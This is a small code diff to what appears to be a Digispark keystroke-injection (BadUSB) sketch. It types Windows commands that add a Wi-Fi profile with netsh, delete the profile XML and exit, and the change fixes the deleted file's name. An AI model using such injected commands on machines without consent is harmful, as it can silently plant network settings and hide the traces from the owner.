@@ -10,7 +10,7 @@ void setup() {
     DigiKeyboard.delay(100);
     DigiKeyboard.println("netsh wlan add profile filename=wifi.xml"); //ADD WIFI PROFILE
     DigiKeyboard.delay(1000);
-    DigiKeyboard.println("del apWCSD.xml"); //DELETE WIFI PROFILE XML FROM INTERNAL STORAGE
+    DigiKeyboard.println("del wifi.xml"); //DELETE WIFI PROFILE XML FROM INTERNAL STORAGE
     DigiKeyboard.sendKeyStroke(KEY_ENTER); //ENTER
     DigiKeyboard.delay(100);
     DigiKeyboard.println("exit"); //EXIT CMD
